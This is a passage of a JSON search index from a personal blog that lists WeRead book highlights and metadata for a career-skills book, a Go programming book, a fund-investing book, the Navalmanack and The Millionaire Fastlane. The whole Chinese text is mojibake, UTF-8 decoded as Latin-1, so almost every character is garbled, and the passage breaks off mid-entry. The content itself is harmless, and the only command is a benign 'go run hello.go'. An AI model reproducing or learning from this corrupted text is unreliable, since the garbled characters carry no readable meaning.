è¶Šä¼˜ç§€çš„èŒåœºäººï¼Œæ€ç»´æ–¹å¼è¶Šå¤šå…ƒåŒ–ã€‚çºµè§‚å›½å†…å¤–äº’è”ç½‘é¢†è¢–ï¼Œå¦‚ä¹”å¸ƒæ–¯ã€å¼ å°é¾™ã€é›·å†›ç­‰ï¼Œéƒ½æ˜¯å¤šå…ƒåŒ–æ€ç»´ã€è·¨ç•Œæ€ç»´çš„é«˜æ‰‹ã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:41 ^8-3298-3355 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬äºŒé¡¹ï¼Œè§£å†³é—®é¢˜çš„èƒ½åŠ›ã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:41 ^8-3918-3930 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬1 æ­¥ï¼Œé™ˆè¿°é—®é¢˜ã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:43 ^8-4548-4558 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬2 æ­¥ï¼Œåˆ†æé—®é¢˜ã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:43 ^8-4736-4746 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬3 æ­¥ï¼Œæ¶ˆé™¤éå…³é”®é—®é¢˜ã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:43 ^8-5834-5847 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬5 æ­¥ï¼Œè¿›è¡Œå…³é”®åˆ†æã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:43 ^8-6146-6158 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬6 æ­¥ï¼Œäº§ç”Ÿç»“æ„åŒ–çš„ç»“è®ºã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:43 ^8-6300-6314 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬7 æ­¥ï¼Œæ±‡æ€»æŠ¥å‘Šã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:43 ^8-6426-6436 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬ä¸‰é¡¹ï¼Œå¼ºå¤§çš„æ²Ÿé€šèƒ½åŠ›ã€‚ â€” åˆ›å»ºäº [[2023-02-24]] 11:44 ^8-6611-6623 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬å››é¡¹ï¼Œå­¦ä¹ æ–°çŸ¥è¯†çš„èƒ½åŠ›ã€‚ â€” åˆ›å»ºäº [[2023-03-01]] 14:15 ^8-8022-8042 ç¬¬1ç«  æŠ€æœ¯äººçš„è‡ªæˆ‘ä¿®å…» ç¬¬äº”é¡¹ï¼Œæ•é”çš„å•†ä¸šå—…è§‰ã€‚ â€” åˆ›å»ºäº [[2023-03-01]] 14:14 ^8-8566-8585","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"è®¡ç®—æœº","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/è®¡ç®—æœº","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}]},{"title":"Goè¯­è¨€ç¼–ç¨‹","date":"2024-08-31T01:35:29.374Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/è®¡ç®—æœº/Goè¯­è¨€ç¼–ç¨‹-è®¸å¼ä¼Ÿ å•æ¡‚åç­‰ç¼–è‘—/","text":"ä½œè€…ï¼šè®¸å¼ä¼Ÿ å•æ¡‚åç­‰ç¼–è‘— - å†…å®¹ç®€ä»‹ ã€ŠGoè¯­è¨€ç¼–ç¨‹ã€‹ æœ¬ä¹¦ä»¥ä»‹ç»Goè¯­è¨€ç‰¹æ€§ä¸ºä¸»ï¼Œç¤ºä¾‹åˆ™å°½é‡é‡‡ç”¨ä½œè€…å¼€å‘å›¢é˜Ÿå¹³å¸¸çš„å®è·µï¼Œå†…å®¹æ¶‰åŠå†…å­˜ç®¡ç†ï¼ˆå †å’Œæ ˆï¼‰ã€é”™è¯¯å¤„ç†ã€OOPã€å¹¶å‘ç¼–ç¨‹ç­‰å…³é”®è¯é¢˜ã€‚ è¿™æœ¬ä¹¦é¢å‘çš„è¯»è€…æ˜¯æ‰€æœ‰æ‰“ç®—ç”¨Goè¯­è¨€çš„å¼€å‘è€…ï¼Œä¸»è¦åŒ…æ‹¬ç›®å‰ä½¿ç”¨Cã€C++ã€Javaã€C#çš„å¼€å‘äººå‘˜ï¼Œç”šè‡³ä¸€äº›Pythonã€PHPå¼€å‘äººå‘˜ä¹Ÿå¯èƒ½è½¬ä¸º Go ç¨‹åºå‘˜ã€‚ Goè¯­è¨€ç¼–ç¨‹ + ã€ŠGoè¯­è¨€ç¼–ç¨‹ã€‹ å±æ€§ å†…å®¹ ISBN 9787115290366 ä½œè€… è®¸å¼ä¼Ÿ å•æ¡‚åç­‰ç¼–è‘— å‡ºç‰ˆå¹´ 2012-09-03 å‡ºç‰ˆç¤¾ äººæ°‘é‚®ç”µå‡ºç‰ˆç¤¾ æ¥æº Goè¯­è¨€ç¼–ç¨‹ åˆ†ç±» è®¡ç®—æœº-ç¼–ç¨‹è®¾è®¡ é«˜äº®åˆ’çº¿ 1.3 ç¬¬ä¸€ä¸ªGoç¨‹åº 1.3 ç¬¬ä¸€ä¸ªGoç¨‹åº cd ~/goyard$ go run hello.go # ç›´æ¥è¿è¡ŒHello, world. ä½ å¥½ï¼Œä¸–ç•Œï¼ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ï¼Œä¼šå°†ç¼–è¯‘ã€é“¾æ¥å’Œè¿è¡Œ3ä¸ªæ­¥éª¤åˆå¹¶ä¸ºä¸€æ­¥ï¼Œè¿è¡Œå®Œååœ¨å½“å‰ç›®å½•ä¸‹ä¹Ÿçœ‹ä¸åˆ°ä»»ä½•ä¸­é—´æ–‡ä»¶å’Œæœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ &gt; â€” åˆ›å»ºäº [[2022-01-03]] 13:39 ^9-3201-3350 1.3 ç¬¬ä¸€ä¸ªGoç¨‹åº 6gå’Œ6læ˜¯64ä½ç‰ˆæœ¬çš„Goç¼–è¯‘å™¨å’Œé“¾æ¥å™¨ï¼Œå¯¹åº”çš„32ä½ç‰ˆæœ¬å·¥å…·ä¸º8gå’Œ8lã€‚Goè¿˜æœ‰å¦å¤–ä¸€ä¸ªGCCç‰ˆæœ¬çš„ç¼–è¯‘å™¨ï¼Œåä¸ºgccgoï¼Œä½†ä¸åœ¨æœ¬ä¹¦çš„è®¨è®ºèŒƒå›´å†…ã€‚ â€” åˆ›å»ºäº [[2022-01-03]] 13:39 ^9-3783-3860 2.1 å˜é‡ 2.1 å˜é‡ ä»æ ¹æœ¬ä¸Šè¯´ï¼Œå˜é‡ç›¸å½“äºæ˜¯å¯¹ä¸€å—æ•°æ®å­˜å‚¨ç©ºé—´çš„å‘½åï¼Œç¨‹åºå¯ä»¥é€šè¿‡å®šä¹‰ä¸€ä¸ªå˜é‡æ¥ç”³è¯·ä¸€å—æ•°æ®å­˜å‚¨ç©ºé—´ï¼Œä¹‹åå¯ä»¥é€šè¿‡å¼•ç”¨å˜é‡åæ¥ä½¿ç”¨è¿™å—å­˜å‚¨ç©ºé—´ã€‚ â€” åˆ›å»ºäº [[2022-01-03]] 14:11 ^16-444-514 1.5 å·¥ç¨‹ç®¡ç† åˆ™ä¸€ä¸ªæ­£å¸¸çš„å·¥ç¨‹ç›®å½•ç»„ç»‡åº”è¯¥å¦‚ä¸‹æ‰€ç¤ºï¼š â”œâ€” â”œâ€” â”œâ€”calc.go â”œâ€” â”œâ€”add.go â”œâ€”add_test.go â”œâ€”sqrt.go â”œâ€”sqrt_test.go â”œâ€” â”œâ€”#åŒ…å°†è¢«å®‰è£…åˆ°æ­¤å¤„ åœ¨ä¸Šé¢çš„ç»“æ„é‡Œï¼Œå¸¦å°–æ‹¬å·çš„åå­—è¡¨ç¤ºå…¶ä¸ºç›®å½•ã€‚xxx_test.goè¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå¯¹äºxxx.goçš„å•å…ƒæµ‹è¯•ï¼Œè¿™ä¹Ÿæ˜¯Goå·¥ç¨‹é‡Œçš„å‘½åè§„åˆ™ã€‚ â€” åˆ›å»ºäº [[2022-01-03]] 13:52 ^291189470-7w23rqayW - ä¸€ä¸ªå®Œæ•´çš„goå·¥ç¨‹","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"è®¡ç®—æœº","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/è®¡ç®—æœº","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}]},{"title":"è§£è¯»åŸºé‡‘ï¼šæˆ‘çš„æŠ•èµ„è§‚ä¸å®è·µï¼ˆä¿®è®¢ç‰ˆï¼‰","date":"2024-08-31T01:35:29.372Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢/è§£è¯»åŸºé‡‘ï¼šæˆ‘çš„æŠ•èµ„è§‚ä¸å®è·µï¼ˆä¿®è®¢ç‰ˆï¼‰-å­£å‡¯å¸†/","text":"ä½œè€…ï¼šå­£å‡¯å¸† - å†…å®¹ç®€ä»‹ ã€Šè§£è¯»åŸºé‡‘ï¼šæˆ‘çš„æŠ•èµ„è§‚ä¸å®è·µï¼ˆä¿®è®¢ç‰ˆï¼‰ã€‹ å­£å‡¯å¸†çš„ç½‘å-LAOKææ€•è¦æ¯”ä»–çš„çœŸåè¿˜è¦å“äº®ï¼Œå› ä¸ºä»–çš„ä½œå“ã€Šè§£è¯»åŸºé‡‘â€”â€”æˆ‘çš„æŠ•èµ„è§‚å’Œå®è·µã€‹å’Œä»–çš„åšå®¢å‡ ä¹ä¼ éäº†ä¸­å›½åŸºé‡‘ç±»ç½‘ç«™çš„å„ä¸ªè®ºå›ï¼Œæˆä¸ºåŸºé‡‘æŠ•èµ„è€…å…¥é—¨å’Œæé«˜çš„å¿…è¯»æ–‡ç« ã€‚æœ¬ä¹¦å°±æ˜¯ä½œè€…åœ¨ã€Šè§£è¯»åŸºé‡‘â€”â€”æˆ‘çš„æŠ•èµ„è§‚å’Œå®è·µã€‹çš„åŸºç¡€ä¸Šï¼Œä»æ˜ç¡®æŠ•èµ„ç›®æ ‡ã€é€‰æ‹©åŸºé‡‘å“ç§å’Œåˆ¶å®šæŠ•èµ„ç­–ç•¥ç­‰æ–¹é¢æ›´ç³»ç»Ÿã€æ›´å…¨é¢åœ°é˜è¿°äº†ä»–é•¿æœŸæŠ•èµ„å’Œæ³¨é‡é£é™©æ§åˆ¶çš„æŠ•èµ„è§‚ç‚¹ï¼Œå¹¶å…¨æ–¹ä½åœ°è§£è¯»äº†åŸºé‡‘æŠ•èµ„çš„å¥¥ç§˜ã€‚æ— è®ºæ˜¯æ–°åŸºæ°‘è¿˜æ˜¯è€åŸºæ°‘ï¼Œé˜…è¯»ä»–çš„è‘—ä½œä¸ä½†æ˜¯å¼€å·æœ‰ç›Šï¼Œè€Œä¸”æ˜¯ä¸€ç§ç²¾ç¥äº«å—ï¼Œå› ä¸ºåœ¨ä»‹ç»åŸºé‡‘çŸ¥è¯†çš„åŒæ—¶ä¹ŸæŠŠç”Ÿæ´»çš„æ™ºæ…§å’Œå“²ç†èå…¥äº†å…¶ä¸­ã€‚æœ¬æ¬¡ä¿®è®¢ï¼Œå¢åŠ äº†å¤šç¯‡æ–°çš„åšæ–‡ï¼Œä½“ç°äº†ä½œè€…çš„æ–°æ€è€ƒå’Œæ–°æ„Ÿæ‚Ÿã€‚ è§£è¯»åŸºé‡‘ï¼šæˆ‘çš„æŠ•èµ„è§‚ä¸å®è·µï¼ˆä¿®è®¢ç‰ˆï¼‰ + ã€Šè§£è¯»åŸºé‡‘ï¼šæˆ‘çš„æŠ•èµ„è§‚ä¸å®è·µï¼ˆä¿®è®¢ç‰ˆï¼‰ã€‹ å±æ€§ å†…å®¹ ISBN 9787513653251 ä½œè€… å­£å‡¯å¸† å‡ºç‰ˆå¹´ 2018-10-01 å‡ºç‰ˆç¤¾ ä¸­å›½ç»æµå‡ºç‰ˆç¤¾ æ¥æº è§£è¯»åŸºé‡‘ï¼šæˆ‘çš„æŠ•èµ„è§‚ä¸å®è·µï¼ˆä¿®è®¢ç‰ˆï¼‰ åˆ†ç±» ç»æµç†è´¢-è´¢ç» é«˜äº®åˆ’çº¿ 27ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆä¸‰ï¼‰ï¼šåŸºé‡‘å…¬å¸ 27ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆä¸‰ï¼‰ï¼šåŸºé‡‘å…¬å¸ æœ€é‡è¦çš„å°±æ˜¯è¦è·‘èµ¢CPIï¼Œ â€” åˆ›å»ºäº [[2022-09-01]] 23:34 ^78-766-779 27ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆä¸‰ï¼‰ï¼šåŸºé‡‘å…¬å¸ åŸºé‡‘å’ŒåŸºæ°‘æœ‰æ—¶å€™æ˜¯åˆ©ç›Šå…±åŒä½“ï¼Œå¯ä»¥åŒèµ¢ã€‚ä½†å¾ˆå¤šæ—¶å€™ï¼ŒåŸºé‡‘è¿˜æ˜¯åªä¸ºè‡ªå·±çš„åˆ©ç›Šç€æƒ³ã€‚ â€” åˆ›å»ºäº [[2022-09-01]] 23:38 ^78-1252-1292 28ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆå››ï¼‰ï¼šå…±è¯† 28ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆå››ï¼‰ï¼šå…±è¯† å¼€åŸºçš„åˆ†çº¢ä¸è¿‡æ˜¯æŠŠå·¦å£è¢‹çš„é’±æ”¾åˆ°å³å£è¢‹ â€” åˆ›å»ºäº [[2022-09-01]] 23:41 ^79-991-1010 28ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆå››ï¼‰ï¼šå…±è¯† å®šæŠ•åœ¨ç‰›å¸‚é‡Œé¢çš„ç¡®å¾ˆå°‘æœ‰äººæ¬£èµï¼Œåˆ°ç†Šå¸‚å´é€æ¸è¢«å¤§å®¶æ¥å—ã€‚å…¶å®ï¼Œç‰›ç†Šæ˜¯å¾ˆéš¾é¢„æµ‹çš„ï¼Œè€Œå®šæŠ•çœŸæ­£èƒ½ç©¿è¶Šç‰›ç†Šã€‚ä½†å¤§å®¶ä¹Ÿæ¸…æ¥šï¼Œå®šæŠ•ä¸æ˜¯èƒ½æ‰­äºä¸ºç›ˆçš„ï¼Œåœ¨å¤§ç†Šå¸‚é‡Œé¢å®šæŠ•ä¸€æ ·æ˜¯äºæŸï¼Œåˆ«å¦„æƒ³ç”¨å®šæŠ•æˆ˜èƒœç†Šå¸‚ã€‚ â€” åˆ›å»ºäº [[2022-09-02]] 00:40 ^79-1114-1208 30ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆå…­ï¼‰ï¼šé—²é’± 30ï¼ç‰›ç†Šè½¬æ¢çš„æ„Ÿæƒ³ï¼ˆå…­ï¼‰ï¼šé—²é’± ä¹°åŸºä¸æ˜¯ç”Ÿæ´»çš„å…¨éƒ¨ã€‚å¦‚æœè¿åƒå·§å…‹åŠ›çš„ä¹è¶£éƒ½è¢«ä¹°åŸºé‡‘çš„æ¬²æœ›å‰¥å¤ºçš„è¯ï¼Œé‚£ä¼¼ä¹çœŸçš„æ˜¯å®ˆè´¢å¥´äº†ã€‚æŠ•èµ„æ˜¯ç°åœ¨ç”Ÿæ´»å’Œæœªæ¥ç”Ÿæ´»çš„å¹³è¡¡ï¼Œæ—¢ç„¶æ˜¯å¹³è¡¡å°±ä¸è¦èˆå»ç°åœ¨çš„ç”Ÿæ´»ï¼Œæ—¥å­æ˜¯ä¸€å¤©å¤©è¿‡çš„ã€‚ â€” åˆ›å»ºäº [[2022-08-31]] 00:01 ^81-940-1025 å››ã€å…³äºå®šæŠ• å››ã€å…³äºå®šæŠ• å¤ªé˜³åº•ä¸‹æ²¡æœ‰æ–°é²œäº‹ï¼Œå¯¹äºåŸºé‡‘æŠ•èµ„æ›´æ˜¯è¿™æ ·ã€‚åŸºç¡€çŸ¥è¯†å°±é‚£ä¹ˆä¸€ç‚¹ï¼Œå› æ­¤æŠ•èµ„ç»å†æ›´ä¸ºé‡è¦ã€‚å»åšå»æƒ³ï¼Œå»æƒ³å»åšã€‚äººåœ¨æ±Ÿæ¹–æ¼‚ï¼Œæ€èƒ½ä¸æŒ¨åˆ€ï¼Ÿ â€” åˆ›å»ºäº [[2022-09-01]] 23:20 ^96-672-736","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç»æµç†è´¢","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%BB%8F%E6%B5%8E%E7%90%86%E8%B4%A2/"}]},{"title":"çº³ç“¦å°”å®å…¸","date":"2024-08-31T01:35:29.370Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢/çº³ç“¦å°”å®å…¸-åŸƒé‡Œå…‹Â·ä¹”æ ¹æ£®/","text":"ä½œè€…ï¼šåŸƒé‡Œå…‹Â·ä¹”æ ¹æ£® - å†…å®¹ç®€ä»‹ ã€Šçº³ç“¦å°”å®å…¸ã€‹ è‡´å¯Œä¸æ˜¯é è¿æ°”ï¼Œå¹¸ç¦ä¹Ÿä¸æ˜¯ä»å¤©è€Œé™çš„ã€‚ç§¯ç´¯è´¢å¯Œå’Œå¹¸ç¦ç”Ÿæ´»æ˜¯æˆ‘ä»¬å¯ä»¥å­¦ä¹ çš„æŠ€èƒ½ã€‚è¿™æœ¬ä¹¦æ”¶é›†æ•´ç†äº†ç¡…è°·æŠ•èµ„äººçº³ç“¦å°”åœ¨è¿‡å»åå¹´é‡Œé€šè¿‡æ¨ç‰¹ã€æ’­å®¢å’Œé‡‡è®¿ç­‰æ–¹å¼åˆ†äº«çš„äººç”Ÿæ™ºæ…§ï¼Œå‘è¯»è€…åˆ†äº«äº†çº³ç“¦å°”å…³äºè´¢å¯Œç§¯ç´¯å’Œå¹¸ç¦äººç”Ÿçš„åŸåˆ™ä¸æ–¹æ³•ã€‚çº³ç“¦å°”ä¸ä»…å‘Šè¯‰è¯»è€…æ€æ ·è‡´å¯Œï¼Œä»–è¿˜å‘Šè¯‰è¯»è€…æ€æ ·çœ‹å¾…äººç”Ÿï¼Œæ€æ ·è·å¾—å¹¸ç¦ã€‚ä»–å¯¹è´¢å¯Œã€äººç”Ÿçš„æ€è€ƒå°†å¸®åŠ©ä½ èµ°è‡ªå·±ç‹¬ç‰¹çš„é“è·¯ï¼Œè¿‡ä¸Šæ›´å¯Œæœ‰ã€æ›´å¹¸ç¦çš„ç”Ÿæ´»ã€‚ çº³ç“¦å°”å®å…¸ + ã€Šçº³ç“¦å°”å®å…¸ã€‹ å±æ€§ å†…å®¹ ISBN 9787521741124 ä½œè€… åŸƒé‡Œå…‹Â·ä¹”æ ¹æ£® å‡ºç‰ˆå¹´ 2022-05-01 å‡ºç‰ˆç¤¾ ä¸­ä¿¡å‡ºç‰ˆé›†å›¢ æ¥æº çº³ç“¦å°”å®å…¸ åˆ†ç±» ç»æµç†è´¢-ç†è´¢ é«˜äº®åˆ’çº¿ ç¬¬äºŒç«  å¢å¼ºåˆ¤æ–­åŠ› ç¬¬äºŒç«  å¢å¼ºåˆ¤æ–­åŠ› é˜…è¯»çš„é¢˜æå’Œå†…å®¹å¹¶ä¸é‡è¦ã€‚æœ€ç»ˆï¼Œä½ ä¼šè¿½éšè‡ªå·±çš„å…´è¶£ï¼Œå®Œæˆå¤§é‡é˜…è¯»ã€‚ä½ çš„ç”Ÿæ´»ä¹Ÿä¼šå› æ­¤å¾—åˆ°æå¤§çš„æ”¹å–„ã€‚è¿™å°±å¥½æ¯”æœ€å¥½çš„é”»ç‚¼æ–¹å¼å°±æ˜¯åšè‡ªå·±æ„Ÿå…´è¶£çš„ã€æ¯å¤©éƒ½èƒ½åšæŒçš„è¿åŠ¨ã€‚åŒæ ·çš„é“ç†ä¹Ÿé€‚ç”¨äºä¹¦ç±ã€åšå®¢ã€æ¨ç‰¹ï¼Œæˆ–è€…ä»»ä½•æœ‰æ€æƒ³ã€æœ‰ä¿¡æ¯ã€æœ‰å­¦ä¹ å†…å®¹çš„ä¸œè¥¿ï¼Œæœ€å¥½çš„é˜…è¯»å°±æ˜¯è‡ªå·±æ„Ÿå…´è¶£çš„ã€çˆ±ä¸é‡Šæ‰‹çš„é˜…è¯»ã€‚ â€” åˆ›å»ºäº [[2022-12-26]] 15:35 ^74-16650-16791","tags":[{"name":"weread","slug":"weread","permalink":"https://hodlyounger.github.io/tags/weread/"},{"name":"å¾®ä¿¡è¯»ä¹¦","slug":"å¾®ä¿¡è¯»ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6/"}],"categories":[{"name":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/"},{"name":"weread","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/"},{"name":"ç»æµç†è´¢","slug":"D-ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢","permalink":"https://hodlyounger.github.io/categories/D-%E7%AB%8B%E5%BF%97%E5%8D%9A%E8%A7%88%E7%BE%A4%E4%B9%A6/weread/%E7%BB%8F%E6%B5%8E%E7%90%86%E8%B4%A2/"}]},{"title":"ç™¾ä¸‡å¯Œç¿å¿«è½¦é“","date":"2024-08-31T01:35:29.368Z","path":"D_ç«‹å¿—åšè§ˆç¾¤ä¹¦/weread/ç»æµç†è´¢/ç™¾ä¸‡å¯Œç¿å¿«è½¦é“-MJÂ·å¾·é©¬ç§‘/","text":"ä½œè€…ï¼šMJÂ·å¾·é©¬ç§‘ - å†…å®¹ç®€ä»‹ ã€Šç™¾ä¸‡å¯Œç¿å¿«è½¦é“ã€‹ ã€Šç™¾ä¸‡å¯Œç¿å¿«è½¦é“ã€‹ç ´è¯‘äº†ç»ˆç”Ÿå¯Œè¶³çš„å¯†ç ï¼Œæ˜¯è§£å¼€è‡´å¯Œå¿«æ·ä¹‹è·¯çš„å¯†é’¥ã€‚ å˜æ›´è½¦é“ï¼Œæ‰¾åˆ°ä½ çš„çˆ†ç‚¸æ€§è´¢å¯ŒåŠ é€Ÿå™¨ï¼Œè·³å‡ºè´¢åŠ¡å¹³åº¸å¤„å¢ƒï¼Œè„±ç¦»æœä¹æ™šäº”æ‰“å·¥ç”Ÿæ´»ï¼Œç¼©çŸ­è‡´å¯Œæ—¶é—´40å¹´ï¼ å¤§å¤šæ•°äººéƒ½éµå¾ªä»¥ä¸‹ä¸‰ç§è´¢å¯Œè·¯å¾„ï¼š äººè¡Œé“â€”â€”æœˆå…‰æ—ï¼Œä»Šæœæœ‰é…’ä»Šæœé†‰ã€‚äººè¡Œé“çš„ç»ˆç‚¹æ˜¯è´«å›°ã€‚ æ…¢è½¦é“â€”â€”ä¸Šç­æ—ï¼Œç‰ºç‰²å½“ä¸‹ï¼ŒæŠ•èµ„æœªæ¥ï¼ˆ40~50å¹´åï¼‰ã€‚æ…¢è½¦é“çš„ç»ˆç‚¹æ˜¯æ™®é€šäººã€‚ å¿«è½¦é“â€”â€”åˆ›ä¸šè€…ï¼ŒæŒæ§è‡ªå·±ï¼ŒåŠªåŠ›å·¥ä½œï¼Œä¸“æ³¨äºä¸ºå®¢æˆ·å¸¦æ¥ä»·å€¼ã€‚å¿«è½¦é“æœ‰æœ›åœ¨æœªæ¥5~10å¹´å†…å˜å¾—å¯Œæœ‰ã€‚ ä½ ç°åœ¨å¤„äºå“ªæ¡é“ä¸Šï¼Ÿã€Šç™¾ä¸‡å¯Œç¿å¿«è½¦é“ã€‹ä½œè€…é¢ è¦†æ€§åœ°è®¤ä¸ºï¼ŒæŠ•èµ„å¤åˆ©å¹¶ä¸æ˜¯ä¸€ä¸ªå¿«é€Ÿå®ç°è´¢åŠ¡è‡ªç”±çš„å¥½æ–¹æ³•ã€‚æœ¬ä¹¦é€šè¿‡å¾ˆå¤šæ•…äº‹å¹¶ç»“åˆå½“å‰æœ€çƒ­é—¨çš„è¡Œä¸šï¼ˆå¦‚äº’è”ç½‘ã€ç”µå•†ã€è‡ªåª’ä½“ç­‰ï¼‰æè¿°äº†ä¸‰ç§è´¢å¯Œè·¯å¾„åŠå…¶é£é™©ï¼ŒåŒæ—¶æå‡ºä½ æ˜¯å¦éœ€è¦è¸ä¸Šå¿«è½¦é“ï¼Œå¹¶å¦‚ä½•è¸ä¸Šè´¢åŠ¡è‡ªç”±ä¹‹è·¯â€”â€”éœ€è¦éµå¾ªå“ªäº›æˆ’å¾‹ã€åšå‡ºå“ªäº›å†³å®šã€æ‘†è„±å“ªäº›é”™è¯¯æ€ç»´ã€é¿å…å“ªäº›é£é™©ã€å¤„ç†å“ªäº›é—®é¢˜ç­‰ã€‚ â€œç”¨ä¸¤å¤©æ—¶é—´è¯»è¯»è¿™æœ¬ä¹¦ï¼Œä½ çš„æ”¶è·å°†æ¯”è¯»ä¸¤å¹´å•†å­¦é™¢è¯¾ç¨‹è¿˜è¦å¤šï¼Œå´åªéœ€èŠ±åè€…1%çš„è´¹ç”¨ã€‚â€ ç™¾ä¸‡å¯Œç¿å¿«è½¦é“ + ã€Šç™¾ä¸‡å¯Œç¿å¿«è½¦é“ã€‹ å±æ€§ å†…å®¹ ISBN 9787508670614 ä½œè€… MJÂ·å¾·é©¬ç§‘ å‡ºç‰ˆå¹´ 2017-05-01 å‡ºç‰ˆç¤¾ ä¸­ä¿¡å‡ºç‰ˆé›†å›¢ æ¥æº ç™¾ä¸‡å¯Œç¿å¿«è½¦é“ åˆ†ç±» ç»æµç†è´¢-è´¢ç» é«˜äº®åˆ’çº¿ ç¬¬18ç«  å¯Œäººå‘è´¢çš„çœŸç›¸ ç¬¬18ç«  